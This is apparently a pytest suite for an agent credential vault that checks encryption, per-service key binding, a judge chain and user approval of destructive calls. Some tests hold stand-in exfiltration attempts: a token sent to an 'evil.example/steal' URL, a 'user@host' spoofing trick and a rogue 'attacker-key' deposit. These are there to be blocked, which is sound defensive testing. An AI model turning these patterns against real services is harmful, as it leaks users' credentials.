import base64
import json
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

from commons_memory import vault as V
from commons_memory.store import CommonsError

SECRET = "plex-tok-9f3a71c2"


@pytest.fixture()
def svc(monkeypatch):
    monkeypatch.setenv("COMMONS_VAULT_KEY", base64.b64encode(os.urandom(32)).decode())
    seen = []

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            seen.append((self.command, self.path, self.headers.get("X-Plex-Token")))
            body = json.dumps({"added": ["Corpse Bride"], "echo": self.headers.get("X-Plex-Token")}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        do_DELETE = do_GET

        def log_message(self, *a):
            pass
    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_port}", seen
    srv.shutdown()


def _judge(monkeypatch, **scores):
    from commons_memory import typesafe
    monkeypatch.setenv("TYPESAFE_API_KEY", "ts-test")
    calls = []
    monkeypatch.setattr(typesafe, "noul", lambda state, qs, timeout=20, key=None: calls.append(qs) or {k: scores.get(k, 0) for k in qs})
    return calls


def test_values_are_encrypted_and_never_listed(store, svc):
    base, _ = svc
    V.add(store, "plex", SECRET, "plex", [base], {"header": "X-Plex-Token"})
    raw = store.q("SELECT * FROM vault_creds")[0]
    assert SECRET.encode() not in bytes(raw["secret"]) and SECRET not in json.dumps(V.listing(store))
    assert V._value(store, "plex") == SECRET
    os.environ["COMMONS_VAULT_KEY"] = base64.b64encode(os.urandom(32)).decode()   # another key can't read it
    with pytest.raises(CommonsError, match="can't be decrypted"):
        V._value(store, "plex")


def test_key_only_goes_to_its_own_service_and_reasons_are_required(store, svc):
    base, _ = svc
    V.add(store, "plex", SECRET, "plex", [base], {"header": "X-Plex-Token"})
    a = store.ensure_agent("muse")
    with pytest.raises(CommonsError, match="may only be sent to"):
        V.use(store, a, "plex", "GET", "http://evil.example/steal", "need the recently added list")
    with pytest.raises(CommonsError, match="may only be sent to"):
        V.use(store, a, "plex", "GET", base.replace("127.0.0.1", "user@127.0.0.1") + "/x", "need the recently added list")
    with pytest.raises(CommonsError, match="justify"):
        V.use(store, a, "plex", "GET", base + "/library/recentlyAdded", "pls")


def test_a_sound_read_is_allowed_scrubbed_and_granted(store, svc, monkeypatch):
    base, seen = svc
    calls = _judge(monkeypatch, legit=0.92)
    V.add(store, "plex", SECRET, "plex", [base], {"header": "X-Plex-Token"})
    a = store.ensure_agent("muse")
    r = V.use(store, a, "plex", "GET", base + "/library/recentlyAdded", "the user asked what was added to Plex today")
    assert r["verdict"] == "allowed" and r["status"] == 200 and "Corpse Bride" in r["body"]
    assert seen[-1][2] == SECRET and SECRET not in json.dumps(r)                 # sent to Plex, never shown
    V.use(store, a, "plex", "GET", base + "/library/sections", "listing the libraries for the same question")
    assert len(calls) == 1                                                        # second read rode the grant


def test_writes_and_bad_reasons(store, svc, monkeypatch):
    base, seen = svc
    V.add(store, "plex", SECRET, "plex", [base], {"header": "X-Plex-Token"})
    a = store.ensure_agent("grok")
    _judge(monkeypatch, legit=0.1)
    assert V.use(store, a, "plex", "GET", base + "/x", "just poking around the server")["verdict"] == "denied"
    _judge(monkeypatch, legit=0.9, destructive=0.8, user_backed=0.2)
    w = V.use(store, a, "plex", "DELETE", base + "/library/metadata/42", "remove a duplicate movie copy")
    assert w["verdict"] == "waiting_for_user" and not [x for x in seen if x[0] == "DELETE"]
    from commons_memory import board as B
    q = B.get(store, w["question_id"])
    assert q["status"] == "blocked" and "DELETE" in q["text"]
    B.answer(store, w["question_id"], "yes, that copy is a duplicate")             # the user approves on the board
    _judge(monkeypatch)                                                           # judge not consulted again
    ok = V.use(store, a, "plex", "DELETE", base + "/library/metadata/42", "remove a duplicate movie copy")
    assert ok["verdict"] == "allowed" and [x for x in seen if x[0] == "DELETE"]
    again = V.use(store, a, "plex", "DELETE", base + "/library/metadata/42", "remove a duplicate movie copy")
    assert again["verdict"] != "allowed"                                         # one approved write = one call


def test_no_judge_means_the_user_decides(store, svc, monkeypatch):
    base, _ = svc
    monkeypatch.delenv("TYPESAFE_API_KEY", raising=False)
    V.add(store, "plex", SECRET, "plex", [base], {"header": "X-Plex-Token"})
    r = V.use(store, store.ensure_agent("muse"), "plex", "GET", base + "/x", "the user asked what was added today")
    assert r["verdict"] == "waiting_for_user"


def test_vault_works_with_no_setup_using_a_private_key_file(store, monkeypatch, tmp_path):
    monkeypatch.delenv("COMMONS_VAULT_KEY", raising=False)
    monkeypatch.setenv("COMMONS_VAULT_KEY_FILE", str(tmp_path / "keys" / "vault.key"))
    V.add(store, "plex", SECRET, "plex", ["http://x/"], {"bearer": True})
    kf = tmp_path / "keys" / "vault.key"
    assert kf.exists() and oct(kf.stat().st_mode)[-3:] == "600" and V._value(store, "plex") == SECRET
    assert V.key_source(store).startswith("file ")


def test_ask_mode_sends_every_use_to_the_user(store, svc, monkeypatch):
    from commons_memory import settings
    base, _ = svc
    _judge(monkeypatch, legit=0.99)
    V.add(store, "plex", SECRET, "plex", [base], {"header": "X-Plex-Token"})
    settings.put(store, "judge_chain", ["ask"])
    r = V.use(store, store.ensure_agent("muse"), "plex", "GET", base + "/x", "the user asked what was added today")
    assert r["verdict"] == "waiting_for_user"


def test_commons_refs_resolve_from_the_vault(store, svc):
    from commons_memory.secrets import Broker
    base, _ = svc
    V.add(store, "anthropic", "sk-ant-test-123456", "anthropic", [base], {"header": "x-api-key"})
    assert Broker(store).resolve_internal("commons://anthropic", "test") == "sk-ant-test-123456"


def test_basic_auth_header(store, svc, monkeypatch):
    base, seen = svc
    V.add(store, "dsh", "pw-123456", "dsh", [base], {"basic": "aerkin"})
    captured = {}
    import urllib.request
    real = urllib.request.urlopen
    monkeypatch.setattr(urllib.request, "urlopen", lambda req, timeout=30: captured.setdefault("h", req.headers) and real(req, timeout=timeout))
    V.call(store, dict(store.q("SELECT * FROM vault_creds WHERE name='dsh'")[0]), "GET", base + "/x")
    assert captured["h"]["Authorization"] == "Basic " + base64.b64encode(b"aerkin:pw-123456").decode()


def test_agents_hand_over_keys_but_never_replace_anothers(store, svc):
    base, _ = svc
    a, b = store.ensure_agent("muse"), store.ensure_agent("grok")
    r = V.deposit(store, a, "seerr", "seerr-key-123456", "seerr", [base], "header:X-Api-Key")
    assert r["stored"] and V._value(store, "seerr") == "seerr-key-123456"
    V.deposit(store, a, "seerr", "seerr-key-rotated", "seerr", [base], "header:X-Api-Key")      # its own: update ok
    with pytest.raises(CommonsError, match="already in the vault"):
        V.deposit(store, b, "seerr", "attacker-key", "seerr", ["http://evil.example/"], "bearer")
    assert V._value(store, "seerr") == "seerr-key-rotated"


def test_handover_checklist_tracks_what_commons_still_needs(store, svc):
    from commons_memory import handover as H
    from commons_memory.orchestrator import Orchestrator
    base, _ = svc
    a = store.ensure_agent("newcomer")
    st = H.status(store, a)
    assert not st["complete"] and {m["item"] for m in st["missing"]} == set(H.ITEMS)
    assert "HAND-OVER INCOMPLETE" in H.nudge(store, a)
    Orchestrator(store).profiles.set(a, expertise={"research": 0.8}, reach=["LAN via tailnet"])
    store.add_item("memory", "The user's NAS is a Synology DS923+", agent_id=a)
    V.deposit(store, a, "windy", "windy-key-1234567", "windy", [base], "header:x-windy-api-key")
    for item in ("schedules", "quota", "work"):
        H.report(store, a, item, "none", "nothing of this kind")
    from commons_memory.capture import Capture
    Capture(store).event(a, "prompt", {"session_id": "h1", "prompt": "what changed on the NAS today"}, harness="mcp")
    st = H.status(store, a)
    assert st["complete"], st["missing"]
    assert H.nudge(store, a) == ""


def test_judge_chain_falls_back_when_a_judge_has_no_key_or_fails(store, svc, monkeypatch):
    from commons_memory import settings
    from commons_memory.providers import ProviderLayer
    base, _ = svc
    monkeypatch.delenv("TYPESAFE_API_KEY", raising=False)
    V.add(store, "plex", SECRET, "plex", [base], {"header": "X-Plex-Token"})
    pl = ProviderLayer(store)
    pl.add_provider("mock", "mock")
    calls = []
    def fake_chat(self, model, prompt, **kw):
        calls.append(model)
        if model == "mock/broken":
            raise RuntimeError("provider down")
        return {"text": '{"legit": 0.93}'}
    monkeypatch.setattr(ProviderLayer, "chat", fake_chat)
    settings.put(store, "judge_chain", ["typesafe", "anthropic/claude-haiku-5-5", "mock/broken", "mock/ok", "ask"])
    r = V.use(store, store.ensure_agent("muse"), "plex", "GET", base + "/x", "the user asked what was added today")
    assert r["verdict"] == "allowed" and calls == ["mock/broken", "mock/ok"]   # no TypeSafe or Anthropic key: skipped


def test_a_connected_agent_can_be_the_decision_agent(store, svc, monkeypatch):
    import threading
    import time as _t
    from commons_memory import settings
    base, _ = svc
    monkeypatch.delenv("TYPESAFE_API_KEY", raising=False)
    V.add(store, "plex", SECRET, "plex", [base], {"header": "X-Plex-Token"})
    asker, judge_ = store.ensure_agent("muse"), store.ensure_agent("antigravity")
    for aid in (asker, judge_):  # both live
        store.x("INSERT INTO wake_channels(id,agent_id,kind,config,secret,enabled,created_at,failures) "
                "VALUES(?,?,'webhook','{}','',1,0,0)", ("w" + aid[-6:], aid))
    settings.put(store, "judge_chain", ["typesafe", "agent:any", "ask"])

    def answer():  # the judge agent sees the request in its inbox and answers
        for _ in range(50):
            r = store.q("SELECT id, judge_agent FROM vault_judgments WHERE status='open'")
            if r:
                assert r[0]["judge_agent"] == judge_                       # never the agent that asked
                V.judge_answer(store, judge_, r[0]["id"], {"legit": 0.9}, "plain read for the user's question")
                return
            _t.sleep(0.1)
    t = threading.Thread(target=answer)
    t.start()
    res = V.use(store, asker, "plex", "GET", base + "/x", "the user asked what was added today")
    t.join()
    assert res["verdict"] == "allowed"
    assert store.q("SELECT reason FROM vault_decisions ORDER BY ts DESC LIMIT 1")[0]["reason"] == "a read with a sound reason"
    monkeypatch.setenv("COMMONS_AGENT_JUDGE_WAIT", "1")                     # nobody answers: falls through to you
    assert V.use(store, asker, "plex", "GET", base + "/y", "another question from the user today")["verdict"] in ("allowed", "waiting_for_user")
